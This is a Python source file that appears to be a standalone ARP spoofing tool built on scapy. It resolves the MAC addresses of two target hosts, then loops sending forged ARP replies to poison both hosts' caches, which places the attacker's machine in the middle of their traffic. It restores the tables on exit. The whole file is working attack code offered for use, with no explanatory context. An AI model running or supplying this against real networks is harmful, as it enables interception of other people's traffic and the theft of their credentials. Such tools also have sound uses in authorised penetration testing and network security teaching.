import signal
from scapy.all import Ether, ARP, srp, send, get_if_hwaddr
from time import sleep
import sys

def get_mac(ip, timeout=5, verbose=False):
    """
    Sends an ARP request to get the MAC address corresponding to an IP address.
    """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=timeout, iface=iface, verbose=verbose)
    if ans:
        return ans[0][1].src

def restore_table(target_ip, target_mac, source_ip, source_mac):
    """
    Sends ARP packets to a network segment to restore the ARP table to its original state.
    """
    packet = ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=source_mac, psrc=source_ip)
    send(packet, verbose=False, count=5, iface=iface)

def signal_handler(sig, frame):
    """
    Handles exit signal to gracefully restore the ARP table and exit.
    """
    print("\nRestoring ARP tables...")
    restore_table(target1_ip, target1_mac, target2_ip, target2_mac)
    restore_table(target2_ip, target2_mac, target1_ip, target1_mac)
    print("ARP spoofing stopped. Exiting.")
    sys.exit(0)

if len(sys.argv) != 4:
    print("Usage: python3 arp_spoof.py <Interface> <Target1_IP> <Target2_IP>")
    sys.exit(1)

iface, target1_ip, target2_ip = sys.argv[1], sys.argv[2], sys.argv[3]
target1_mac = get_mac(target1_ip)
target2_mac = get_mac(target2_ip)

if not target1_mac or not target2_mac:
    print("Failed to get MAC addresses. Exiting.")
    sys.exit(1)

try:
    print(f"Poisoning {target1_ip} and {target2_ip}. Press CTRL+C to stop and restore ARP tables.")
    signal.signal(signal.SIGINT, signal_handler)
    while True:
        send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst=target1_mac), iface=iface, verbose=False)
        send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst=target2_mac), iface=iface, verbose=False)
        sleep(2)
except KeyboardInterrupt:
    signal_handler(None, None)
